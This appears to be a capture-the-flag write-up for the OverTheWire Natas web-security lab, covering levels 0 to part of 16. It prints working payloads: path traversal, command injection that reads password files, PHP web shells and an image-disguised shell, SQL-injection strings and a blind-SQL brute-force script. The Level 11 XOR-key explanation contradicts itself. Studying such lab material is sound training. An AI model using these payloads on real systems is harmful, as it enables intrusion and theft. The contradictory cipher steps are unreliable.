



# OverTheWire Natas Solutions

![Code](https://img.shields.io/badge/Code-Markdown-orange?logo=markdown) ![Coverage](https://img.shields.io/badge/Coverage-50%25-yellow) ![Status](https://img.shields.io/badge/Status-In_production-green)

This is a collection of solution for the [OverTheWire Natas](https://overthewire.org/wargames/natas/) problems, a collection of 34 levels, each dealing with the basics of web security. All of the levels are found at http://natasX.natas.labs.overthewire.org, where X is the level number. To access each challenge, we need a:
- Username: `natasX`, where X is the level number.
- Password: a 32 character long ASCII characters (uppercase `A-Z` and lowercase`a-z`) and numbers `0-9` word.

Please use these as hints to solve the challenges yourself. Do not use them to cheat and not learn...
> "With borrowed power, you'll never walk the path of the almighty."
<br>\- Cid Kagenou, ["The Eminence in Shadow"](https://shadow-garden.jp/), Daisuke Aizawa

## Levels
- [Level 0](#level0)
- [Level 1](#level1)
- [Level 2](#level2)
- [Level 3](#level3)
- [Level 4](#level4)
- [Level 5](#level5)
- [Level 6](#level6)
- [Level 7](#level7)
- [Level 8](#level8)
- [Level 9](#level9) 
- [Level 10](#level10)
- [Level 11](#level11) 
- [Level 12](#level12) 
- [Level 13](#level13) 
- [Level 14](#level14) 
- [Level 15](#level15)
- [Level 16](#level16)
- [Level 17](#level17)
- [Level 18](#level18)
- [Level 19](#level19)
- [Level 20](#level20)
- [Final Notes](#finalnotes)

## Level 0 <a name="level0"></a>
Level 0 is pretty straight-forward. After logging into the level using the password `natas0`, we get the following screen:

![Level 0](/imgs/lvl0/screenshot.png)

Viewing the page source results in us finding the password for the next level:
```html
<html>
    <head>
        ...
    </head>
    <body>
        <h1>natas0</h1>
        <div id="content">
            You can find the password for the next level on this page.

            <!--The password for natas1 is **** -->
        </div>
    </body>
</html>
```

## Level 1 <a name="level1"></a>
Landing on the site, we see this:

![Level 1](/imgs/lvl1/screenshot.png)

Since we can't see the source code by simply right-clicking, there's a keyboard shortcut that will open the [Developer Tools](https://firefox-source-docs.mozilla.org/devtools-user/) automatically: `<F12>`[^1]. <br> From there, inspecting the HTML code will give us the password:
```html
<html>
    <head>
        ...
    </head>
    <body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
        <h1>natas1</h1>
        <div id="content">
            You can find the password for the next level on this page, but rightclicking has been blocked!

        <!--The password for natas2 is **** -->
        </div>
    </body>
</html>
```

## Level 2 <a name="level2"></a>
Landing on the site, we see this:

![Level 2](/imgs/lvl2/screenshot.png)

Now that we are free from the constriction of no right-click, we can inspect the page freely. When we do, we find something peculiar:
```html
<html>
    <head>
        ...
    </head>
    <body>
        <h1>natas2</h1>
        <div id="content">
            There is nothing on this page
            <img src="files/pixel.png">
        </div>
    </body>
</html>
```
There's a 1x1 `pixel.png` image on the screen, right next to the string. One might think the solution is in the image, yet there's something more interesting next to it. <br> We can see a path to another folder, named `files/`. Adding that to the URL of the site, we get an index of files inside the Apache server:

![Index](/imgs/lvl2/index.png)

Upon clicking the `users.txt` file, we get some passwords, although only one is of interest to us:
```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:****
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

## Level 3 <a name="level3"></a>
Landing on the site, we see this:

![Level 3](/imgs/lvl2/screenshot.png)

The same page as [Level 2](#level2). Again, inspecting it gives us nothing, except...
```html
<html>
    <head>
        ...
    </head>
    <body>
        <h1>natas3</h1>
        <div id="content">
            There is nothing on this page
            <!-- No more information leaks!! Not even Google will find it this time... -->
        </div>
    </body>
</html>
```

The phrase "Not even Google will find it this time..." may seem like a provocation, yet it reveals something interesting: the [Robots Exclusion Protocol](https://en.wikipedia.org/wiki/Robots.txt):
> The Robots Exclusion Protocol is a standard used by websites to indicate to visiting web crawlers and other web robots which portions of the website they are allowed to visit. 

That's why Google won't be able to find it... <br> Anyways, this protocol implies the existence of a `robots.txt` file somewhere in the server. In fact, we can find it immediately in http://natas3.natas.labs.overthewire.org/robots.txt :
```
User-agent: *
Disallow: /s3cr3t/
```
Seems like web crawlers aren't allowed to access a hidden path called `/s3cr3t/`. Thankfully we aren't crawlers, we're hackers, so we can visit it easily. In http://natas3.natas.labs.overthewire.org/s3cr3t we find another Apache index, displaying a `users.txt` file like before:

![Index](/imgs/lvl3/index.png)

Clicking the file gives us the password to the next level:
```
natas4:****
```

## Level 4 <a name="level4"></a>
Landing on the site, we see this:

![Level 4](/imgs/lvl4/screenshot.png)

The site tells us it accepts only requests from a specific URL/webpage. To understand better what we are working with, let's do some theory:
> The web works by using protocols, in this case the [HTTP protocol](https://en.wikipedia.org/wiki/HTTP) (HyperText Transfer Protocol), which allows request-response communication between server and client. The request includes the request method, the requested URL and the protocol version. However, it can also include additional, potentially needed information, the _request headers_.

In this case, the header we're looking for is the [referer header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer), which specifies where the request is coming from, and that's exactly what we need. <br>
Opening the Developer Tools[^1], we can access the Network tab, where if we reload, we can see the traffic generated after:

![Network](/imgs/lvl4/network.png)


We can then access the `index.php` request (which I'll refer to now as the main one), and see the various headers sent. Thus, we need to "create" a referer header specifically to mask our real one. <br>
A little quirk about Developer Tools, is that it allows us to create/modify custom headers to send out. We'll do just that in this level. Right-clicking on the main request, and selecting "Edit and Resend", brings us to an editor. The solution for this level can only be accessed by http://natas5.natas.labs.overthewire.org, so we need to add in the last empty box the name "Referer", and value of the URL. <br>
Once done, we can send it, and get a response. Viewing it raw, we get the solution of the level:
```html
<html>
    <head>
      ...
    </head>
    <body>
        <h1>natas4</h1>
        <div id="content">
            Access granted. The password for natas5 is ****
            <br/>
            <div id="viewsource"><a href="index.php">Refresh page</a></div>
        </div>
    </body>
</html>
```

## Level 5 <a name="level5"></a>
Landing on the site, we see this:

![Level 5](/imgs/lvl5/screenshot.png)

Similarly to the past level, here we need some kind of authorization to view the full page. But how can the website know we aren't allowed to access it? It must _store_ some kind of information that prevents us from viewing it... <br> 
The only way a site remembers something is via [cookies](https://en.wikipedia.org/wiki/HTTP_cookie):
> An HTTP cookie is a small block of data created by a web server while a user is browsing a website and placed on the user's computer or other device by the user's web browser.

Not only it's stored locally, but it's part of a request header. Now, opening the Network tab in the Developer Tools[^1], and scrolling down, we see the cookie header is set to `loggedin=0`:

![Cookies](/imgs/lvl5/cookies.png)

Now, doing the same thing as before, we can edit and resend the header, adding another cookie header and setting it to `loggedin=1` (don't worry about deactivating the first one, only the last cookie will be executed). Doing so, gives us the raw HTML code with the solution:
```html
<html>
    <head>
        ...
    </head>
    <body>
        <h1>natas5</h1>
        <div id="content">
        Access granted. The password for natas6 is ****</div>
    </body>
</html>
```

## Level 6 <a name="level6"></a>
Landing on the site, we see this:

![Level 6](/imgs/lvl6/screenshot.png)

We notice an input field, and a source code link. Trying to input anything will result in an error, thus let's look at the code first. I'll just show the most important part:
```js
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

We notice there's a method for posting and checking the secret, yet no password. One thing that should be immediate, though, is the include file stored at `includes/secret.inc`. We can access it, and looking at the raw HTML, it shall give us the secret we need:
```js
<?
$secret = "****";
?>
```
Now that we know the secret, we can just go back to the main page, and input it. The result is the password for the next level:
```html
<html>
    <head>
        ...
    </head>
    <body>
        <h1>natas6</h1>
        <div id="content">

            Access granted. The password for natas7 is ****
            <form method=post>
                Input secret: <input name=secret><br>
                <input type=submit name=submit>
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>
```

## Level 7 <a name="level7"></a>
Landing on the site, we see this:

![Level 7](/imgs/lvl7/screenshot.png)

A simple link brings us to the different pages in the web app. Nothing strange, except if we look to the URL: `http://natas7.natas.labs.overthewire.org/index.php?page=home` and `http://natas7.natas.labs.overthewire.org/index.php?page=about`. Whenever we change site, so does the URL. This is because the HTTP Protocol for GET (which is what is used here to "get" the pages) displays, after the `?`, variables used in the search. The variable here is `pages=` followed by the page. If we try to modify it to whatever, we get the following error:

![Error](/imgs/lvl7/error.png)

No matter what we try, we never get a valid response. But if we dig deeper, especially in the code for the page itself, we see this:
```html
<html>
    <head>
        ...
    </head>
    <body>
        <h1>natas7</h1>
        <div id="content">

            <a href="index.php?page=home">Home</a>
            <a href="index.php?page=about">About</a>
            <br>
            <br>
            this is the front page

            <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
        </div>
    </body>
</html>
```
So there is a path where the password is stored[^2]. Yet how can we access it when there's no way to move around in a web server? Here comes in play the GET variable from earlier... <br>
For those who don't use Linux, or aren't familiar to its Shell syntax, to move around folders one can use the command `cd /path_to_folder/`, and to move out, simply `cd ..` where the double dots represent the parent directory to where you are. <br>
We can use this to out advantage to "escalate" the folder, and reach the desired path in `/etc/natas_webpass/natas8`. After trial and error, one can come up to an URL like this: <br>
`http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8` <br>
And there, our password is shown.

## Level 8 <a name="level8"></a>
Landing on the site, we see this:

![Level 8](/imgs/lvl8/screenshot.png)

Same as [Level 6](#level6), yet checking the source code from the link gives us different code:
```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
Reading through it, we need to get a string such that when it's encoded by the function `encodeSecret($secret)`, it gives us the `$encodedSecret` value. Let's go through the function step-by-step:
```php
function encodeSecret($secret) {
    return a binary-to-hexadecimal string... 
       ↓       ↓
    return bin2hex(strrev(base64_encode($secret)));
                      ↑               ↑   
       ...Of the inverse of a base64 encoded string
}
```
What the level requires us to do, is a little reverse engineering of the algorithm that encodes the secret. Now that we know what it does, using the inverse logic, we can reverse the process of encoding to get the original string it was used to encode the secret. <br> 
Let's create a PHP file (or use an online editor) to undo the encoding. Simply, we need to do the opposite of the algorithm:
```php
function encodeSecret($secret) {
    return a base64 decoded string... 
       ↓       ↓
    return base64_decode(strrev(hex2bin($secret)));
                      ↑               ↑   
       ...Of the inverse of a hexadecimal-to-binary string
}
```
And feeding into the function the `$encodedSecret`, we get the `$decodedSecret = "oubWYf2kBq"`. <br>
We can now input it into the web app, and it'll give us the password for the next level:
```html
<html>
    <head>
        ...
    </head>
    <body>
        <h1>natas8</h1>
        <div id="content">

            Access granted. The password for natas9 is ****
            <form method=post>
                Input secret: <input name=secret><br>
                <input type=submit name=submit>
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>
```

## Level 9 <a name="level9"></a>
Landing on the site, we see this:

![Level 9](/imgs/lvl9/screenshot.png)

Where the input field is used to check if a word is present in a `dictionary.txt` file, as the link tells us:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
Looking closer, we see the key is not sanitized in any way, thus we can exploit this weakness and use it to our advantage in an [XSS](https://capec.mitre.org/data/definitions/63.html) attack to gain information about the password. The biggest problem, though, is the [`grep`](https://en.wikipedia.org/wiki/Grep) command, which we need to escape from. <br>
Looking at the [`man`](https://en.wikipedia.org/wiki/Man_page) pages for it, we see that running it with the `--help` flag will print out, and then exit. Let's try it: we'll create a payload like this one, and see what happens to the output... <br>
Payload: `--help && pwd # `&emsp;← Beware of the final space, it's necessary or it won't work

Output:

[Output](/imgs/lvl9/output.png)

And so, we know we're in `/var/www/natas/natas9` and can now freely navigate around the folders inside the server. If one read the rules closely, we know that[^2]:
> All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.

Thus we need to get to `/etc/natas_webpass/natas10` and we'll have our password. Using the same structure as [Level 7](#level7), we can access it, and retrieve the secret hid in plain sight at the last line: <br>
`--help && cat ../../../../etc/natas_webpass/natas10 # `

## Level 10 <a name="level10"></a>
Landing on the site, we see this:

![Level 10](/imgs/lvl10/screenshot.png)

Now we can't directly concatenate commands in the input field, since in the source code, any character in the list cannot be used:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
So now we can't use `[ ; | & ]`. Luckly for us, the command is still `grep`, which we can abuse to spit out the contents of a file. But how can we access the `/etc/natas_webpass/natas11` if we can't move around? Well, we can just feed the path into `grep`, and he'll do the work for us. <br>
Modifing a bit the payload, we can retrieve and display the password for the next level: <br>
Payload: `{random character} ../../../../etc/natas_webpass/natas11 #` <br>
Output: 
```html
<html>
    <head>
        ...
    </head>
    <body>
        <h1>natas10</h1>
        <div id="content">

            For security reasons, we now filter on certain characters<br/><br/>
            <form>
                Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
            </form>


            Output:
            <pre>
                ****
            </pre>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>
```

## Level 11 <a name="level11"></a>
Landing on the site, we see this:

![Level 11](/imgs/lvl11/screenshot.png)

A simple input that changes the background color to a hexadecimal value. The text above, though, is what's scary. Let's check out the source code:
```php
<?
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>

...

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
?>
```
Let's take a look at the cookie that's sent to the server:

![Cookie](/imgs/lvl11/cookie.png)

Indeed, there's some [XOR Cypher](https://en.wikipedia.org/wiki/XOR_cipher) on the cookie that's sent, where we could've edited some information about the `showpassword` field. By definition, a XOR cypher isn't exactly the most secure one:
> The XOR operator is extremely common as a component in more complex ciphers. By itself, using a constant repeating key, a simple XOR cipher can trivially be broken using frequency analysis. If the content of any message can be guessed or otherwise known then the key can be revealed. Its primary merit is that it is simple to implement, and that the XOR operation is computationally inexpensive. A simple repeating XOR (i.e. using the same key for xor operation on the whole data) cipher is therefore sometimes used for hiding information in cases where no particular security is required.

Expecially when the message contains sensible information mixed in. It would be easy to reverse engineer the solution by decoding and XORing the data, but the `key` is hidden to us. We need to find what it is in order to pass the level. <br>
We can exploit the fact that XOR is an associative operation: $\text{plaintext} ⊕ \text{key} = \text{ciphertext} \Rightarrow$ <br> $\text{ciphertext} ⊕ \text{key} = \text{plaintext} \land \text{ciphertext} ⊕ \text{plaintext} = \text{key}$. <br>
We know the $\text{ciphertext}$ (which is our cookie), but we need the $\text{plaintext}$ in order to find the $\text{key}$. We can generate it by using the same code that's used to save data, naturally without the XOR function:
```php
<?php
$d = array( "showpassword" => "no", "bgcolor" => "#ffffff");
echo base64_encode(json_encode($d));
?>
```
What we get is the $\text{ciphertext}=$`eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=`. Using an online encoder (I highly suggest [this one](https://gchq.github.io/CyberChef/)), we can XOR the two and get the key used: <br>
`HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=` ⊕ `eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=` $=$ `eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe` <br>
Since XOR repeats the key for the size of the input, we have `$key =  eDWo`. Editing the code for the encryption function, we can now generate a new cookie that has `"showpassword" => "yes"`:
```php
<?php
function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
$d = array( "showpassword" => "yes", "bgcolor" => "#ffffff");
echo base64_encode(xor_encrypt(json_encode($d)));
?>
```
The new cookie generated is `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`. This cookie has the option to show the password, so when we add it to the request header like `data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`, we get the solution:
```html
<html>
    <head>
        ...
    </head>

    <h1>natas11</h1>
    <div id="content">
        <body style="background: #ffffff;">
                Cookies are protected with XOR encryption<br/><br/>
                
                The password for natas12 is ****
                <form>
                        Background color: <input name=bgcolor value="#ffffff">
                        <input type=submit value="Set color">
                </form>

                <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
                </div>
        </body>
</html>
```

## Level 12 <a name="level12"></a>
Landing on the site, we see this:

![Level 12](/imgs/lvl12/screenshot.png)

We can browse our files, and then upload one onto the server at the `/upload/` folder. The problem is, the name is jangled in the code via a random name generator:
```php
`<?php  
  
function genRandomString() {  
	$length = 10;  
	$characters = "0123456789abcdefghijklmnopqrstuvwxyz";  
	$string = "";  
  
	for ($p = 0; $p < $length; $p++) {  
		$string .= $characters[mt_rand(0, strlen($characters)-1)];  
	}  
  
	return $string;  
}  
  
function makeRandomPath($dir, $ext) {  
	do {  
		$path = $dir."/".genRandomString().".".$ext;  
	} while(file_exists($path));  
		return $path;  
}  
  
function makeRandomPathFromFilename($dir, $fn) {  
	$ext = pathinfo($fn, PATHINFO_EXTENSION);  
	return makeRandomPath($dir, $ext);  
}  
  
if(array_key_exists("filename", $_POST)) {  
	$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);  
  
  
	if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {  
		echo "File is too big";  
	} else {  
		if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {  
			echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";  
		} else{  
			echo "There was an error uploading the file, please try again!";  
		}  
	}  
} else {  
?>
<form enctype="multipart/form-data" action="index.php" method="POST">  
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />  
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />  
Choose a JPEG to upload (max 1KB):<br/>  
<input name="uploadedfile" type="file" /><br />  
<input type="submit" value="Upload File" />  
</form>  
<?php } ?>
```
Focusing too much on decrypting the random name generator is just wasting time. But if one looks closer, we see we have no restriction on what we can send as file. <br>
This immediately rings a bell, as this is a simple [Web Shell attack](https://cwe.mitre.org/data/definitions/434.html) , where we upload a file with malicious code, that'll run on the server-side of the web app. Let's try it right away... We're going to create a file (since the server runs PHP commands, it's a PHP script) that'll print us something to make sure we can execute code: <br>
`shell.php`
```php
<?php 
	$output = shell_exec('pwd');  
	echo $output;
?>
```
Okay, let's feed it into the web app...
![Shell](/imgs/lvl12/shell.png)
While we're fine with another name, the server does have some restriction (although very minimal) to files, since it automatically changes them to `.jpg` by default. We need to circumvent how files are named to actually execute server-side code. <br>
If one looks closer at the HTML code this time, we see something hidden in plain sight:
```html
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />  
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
```
There are two hidden input fields, that actually display vital information we can manipulate. In the Developer Tools[^1], we can edit the HTML code to show them:
![Hidden fields](/imgs/lvl12/hidden.png)
While we don't care about the size, we can manipulate the files name via the input field. That's great news since that's what we wanted. Now let's change the file type to `.php` and see what the site responds once we check it out. If all went correctly, it should display the current working directory: 
![pwd](/imgs/lvl12/pwd.png)
And in fact it does! That's great news. Now we can use this to our advantage to get the next level's password by navigating the web server just like how we did in [Level 7](#level7), [Level 9](#level9) and [Level 10](#level10). Modifying the `shell.php` script to move to the solution path is relatively easy (after some trial and error):
[`shell.php`](/scripts/lvl12/shell.php)
```php
<?php 
	$output = shell_exec('cat ../../../../../etc/natas_webpass/natas13');  
	echo $output;
?>
```

## Level 13 <a name="level13"></a>
Landing on the site, we see this:

![Level 13](/imgs/lvl13/screenshot.png)

Now things get trickier... We cannot pass anything except a `.jpg` file. Or at least, that's what the web site wants us to think:
```php
`<?php  
  
function genRandomString() {  
	$length = 10;  
	$characters = "0123456789abcdefghijklmnopqrstuvwxyz";  
	$string = "";  
  
	for ($p = 0; $p < $length; $p++) {  
		$string .= $characters[mt_rand(0, strlen($characters)-1)];  
	}  
  
	return $string;  
}  
  
function makeRandomPath($dir, $ext) {  
	do {  
		$path = $dir."/".genRandomString().".".$ext;  
	} while(file_exists($path));  
	return $path;  
}  
  
function makeRandomPathFromFilename($dir, $fn) {  
	$ext = pathinfo($fn, PATHINFO_EXTENSION);  
	return makeRandomPath($dir, $ext);  
}  
  
if(array_key_exists("filename", $_POST)) {  
	$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);  
  
	$err=$_FILES['uploadedfile']['error'];  
	if($err){  
		if($err === 2){  
			echo "The uploaded file exceeds MAX_FILE_SIZE";  
		} else{  
			echo "Something went wrong :/";  
		}  
	} else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {  
		echo "File is too big";  
	} else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {  
		echo "File is not an image";  
	} else {  
		if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {  
			echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";  
		} else{  
			echo "There was an error uploading the file, please try again!";  
		}  
	}  
} else {  
?>  
  
<form enctype="multipart/form-data" action="index.php" method="POST">  
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />  
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />  
Choose a JPEG to upload (max 1KB):<br/>  
<input name="uploadedfile" type="file" /><br />  
<input type="submit" value="Upload File" />  
</form>  
<?php } ?>`
```
Scary as it sounds, `exif_imagetype($_FILES['uploadedfile']['tmp_name'])` (which is what checks if the file in input is a image or not) is actually pretty flawed. As its [manual](https://www.php.net/manual/en/function.exif-imagetype.php) says:
> exif_imagetype() reads the first bytes of an image and checks its signature.

Let me rephrase that, so that it's clearer: 
> exif_imagetype() reads **only** the first bytes of an image and checks its signature

It does not check file type or anything else. Thus, we can use this to our favour and create a fake `.png` file that will execute malicious code inside. But how do we make an image file run code? <br>
Using some command trickery, we can append PHP comment to a file and then rename it to `.php` as we did in [Level 12](#level12) to execute server-side code. Here are the commands[^3]:

```bash
cp /random/file.png .		# <- copy a random png file to working directory
mv file.png shell.png		# rename because it's cooler B)
convert -resize 9x9 shell.png shell.png		# <- resize the image so that we don't exceed size limits. 
echo '<?php $output = shell_exec("pwd"); echo $output; ?>' >> shell.png # append our malicious code to the image
mv shell.png shell.php		# change file type
``` 

One may ask: why all of this if we get at the end a `.php` file? Well, since we started with a `.png`, the first few bytes read by `exif_imagetype()` fool it to think it's an image, while the rest of our code is further down the file. We can also check this by using the `file` command in Linux, which uses the same technology:
```bash
> file shell.php 
shell.php: PNG image data, 9 x 5, 8-bit colormap, non-interlaced
``` 
<br>
We can now upload the file (remember to change the file type in the hidden input field) and see what happens:

![pwd](/imgs/lvl13/pwd.png)

Ignoring the gibberish in the top, we see our path is `/var/www/natas/natas13/upload`. Same as before, let's change the code so that we can see the password to the next challenge:
```bash
# ...
echo '<?php $output = shell_exec("cat /../../../etc/natas_webpass/natas14"); echo $output; ?>' >> shell.png
# ...
```
Simply reuploading [`shell.php`](/scripts/lvl13/shell.php) and clicking it, we can see the password. 

## Level 14 <a name="level14"></a>
Landing on the site, we see this:

![Level 14](/imgs/lvl14/screenshot.png)

A simple login form which asks us for a username and password. Let's take a look at the source code:
```php
<?php  
if(array_key_exists("username", $_REQUEST)) {  
	$link = mysqli_connect('localhost', 'natas14', '<censored>');  
	mysqli_select_db($link, 'natas14');  
  
	$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";  
	if(array_key_exists("debug", $_GET)) {  
		echo "Executing query: $query<br>";  
	}  
  
	if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {  
		echo "Successful login! The password for natas15 is <censored><br>";  
	} else {  
		echo "Access denied!<br>";  
	}  
	mysqli_close($link);  
} else {  
?>  
  
<form action="index.php" method="POST">  
Username: <input name="username"><br>  
Password: <input name="password"><br>  
<input type="submit" value="Login" />  
</form>  
<?php } ?>
```
Seems like we're working with [MySQL](https://www.mysql.com/), an open source database for storing information in tables. It would be easy for us to see the information stored, but we can't since it's hosted on the server-side. Or can we? <br>
Working with SQL, it's impossible not to think about [SQL Injection](https://capec.mitre.org/data/definitions/66.html), a common attack done to extract username, passwords and log in without brute force. Here, we see in the source code the `username` is not sanitized, and thus we can send a payload to log us in no matter what. The easiest one will work perfectly for this case: `" OR 1 = 1 # `. Simply, it'll always return true, and we can bypass the check `if(mysqli_num_rows(mysqli_query($link, $query)) > 0)` (it becomes `if(true > 0)` which is true):
```html
<html>
	<head>
		...
	</head>
	<body>
		<h1>natas14</h1>
		<div id="content">
			Successful login! The password for natas15 is ****<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		</div>
	</body>
</html>
```

## Level 15 <a name="level15"></a>
Landing on the site, we see this:

![Level 15](/imgs/lvl15/screenshot.png)

Now things get complicated. We need a way to retrieve the password only from asking basic information to the SQL database:
```php
``<?php  
  
/*  
CREATE TABLE `users` (  
`username` varchar(64) DEFAULT NULL,  
`password` varchar(64) DEFAULT NULL  
);  
*/  
  
if(array_key_exists("username", $_REQUEST)) {  
	$link = mysqli_connect('localhost', 'natas15', '<censored>');  
	mysqli_select_db($link, 'natas15');  
  
	$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";  
	if(array_key_exists("debug", $_GET)) {  
		echo "Executing query: $query<br>";  
	}  
  
	$res = mysqli_query($link, $query);  
	if($res) {  
		if(mysqli_num_rows($res) > 0) {  
			echo "This user exists.<br>";  
		} else {  
			echo "This user doesn't exist.<br>";  
		}  
	} else {  
		echo "Error in query.<br>";  
	}  
  
	mysqli_close($link);  
} else {  
?>  
  
<form action="index.php" method="POST">  
Username: <input name="username"><br>  
<input type="submit" value="Check existence" />  
</form>  
<?php } ?>``
```
Whenever we send a username, the code checks for its existence in the table `users` (which structure is kindly provided to us). The hard part is guessing which user has the password we need, and how to get it. <br>
This is an example of [Blind SQL Injection](https://capec.mitre.org/data/definitions/7.html), where:
> Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Simply testing which possible name we have for the next challenge is easy: `natas16` is a valid username. Now we need to extract information of the password. Based on the existence or not of an user, we can determine if it has a certain password or not by just asking if it exists. Let's use the input field to search for a possible password:
```sql
natas16" AND BINARY substring(password,1,1) = 'a' -- 
```
Let's break down what's happening: `natas16 "` is added to the query, `AND` concatenates commands, `BINARY` converts it to a binary value to get case-sensitivity (since in SQL `"HELLO" == "hello"` but `BINARY "HELLO" != "hello"`) and [`substring(string s, int beginning, int end)`](https://www.php.net/manual/en/function.substr.php) returns a section of the string `s` from `beginning` to `end`, and we compare it with a random character. If it does, it returns true, otherwise false. All and all, this payload simply means _search for the username "natas16" and if it has first character in the password an  "a"_. <br>
Now, we could brute force the password doing by hand, changing character if it returns false, or append it if it's true, but knowing it's 32 characters long string of random characters and numbers, it takes quite a while. Let's write a script that'll automatically do it for us: <br>
[`blind-sql.py`](/scripts/lvl15/blind-sql.py)
```python
import string       # For password generation
import requests     # For http requests
from requests.auth import HTTPBasicAuth

# Basic htpp request variables
login = HTTPBasicAuth("natas15", "****")	# Username and password
url = "http://natas15.natas.labs.overthewire.org/"

# Password generator
count = 1
password = ""
max_lenght = 32
valid_characters = string.digits + string.ascii_letters

# While we haven't found the password...
while count <= max_lenght:
    # ... for each valid character (numbers, lowercase and uppercase)
    for c in valid_characters:
        # Our payload
        payload = "natas16\" AND BINARY substring(password, 1, " + str(count) + ") = \"" + password + c + "\" -- "
        response = requests.post(url, data = {"username": payload}, auth = login, verify = False)
        # We got a hit
        if "This user exists." in response.text:
            print("Found: " + password + c)
            password += c
            count += 1

print("Final password: " + password)
```
After waiting, the password will be printed out fully.

## Level 16 <a name="level16"></a>
Landing on the site, we see this:

![Level 16](/imgs/lvl16/screenshot.png)

Seems like we're back to [Level 10](#level10). but we have some more characters we can't use...
```php
<?  
$key = "";  
  
if(array_key_exists("needle", $_REQUEST)) {  
	$key = $_REQUEST["needle"];  
}  
  
if($key != "") {  
	if(preg_match('/[;|&`\'"]/',$key)) {  
		print "Input contains an illegal character!";  
	} else {  
		passthru("grep -i \"$key\" dictionary.txt");  
	}  
}  
?>
```
We can't use `/ [ ; | & ' " ] /`, which means we can't escape from `grep` since there are quotes, no matter what we try. So to get the solution, we need to run code, inside code. <br>
